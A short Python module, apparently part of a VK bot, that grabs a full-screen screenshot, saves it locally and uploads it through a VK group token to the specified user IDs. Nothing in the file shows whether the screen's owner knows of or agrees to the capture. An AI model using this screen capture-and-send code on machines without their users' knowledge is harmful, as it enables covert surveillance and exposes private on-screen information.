def main_function_screenshot(users_id):

    def screenshot_sends_vk():
        import pyscreenshot

        img = pyscreenshot.grab()

        img.save('screen.png')

    def function_send_photo(users_id):
        from vk_api.upload import VkUpload
        from vk_api.utils import get_random_id
        import vk_api
        from utils.config import settings

        session = vk_api.VkApi(token=settings['api_group_vk'])

        screenshot_sends_vk()
        peer_ids = users_id

        def upload_photo(upload, photo):
            response = upload.photo_messages(photo)[0]

            owner_id = response['owner_id']
            photo_id = response['id']
            access_key = response['access_key']

            return owner_id, photo_id, access_key

        def send_photo(vk, peer_id, owner_id, photo_id, access_key):
            attachment = f'photo{owner_id}_{photo_id}_{access_key}'
            vk.messages.send(
                random_id=get_random_id(),
                peer_id=peer_id,
                attachment=attachment
            )

        def main():
            vk = session.get_api()
            upload = VkUpload(vk)

            send_photo(vk, peer_ids, *upload_photo(upload, 'screen.png'))

        main()

    function_send_photo(users_id=users_id)
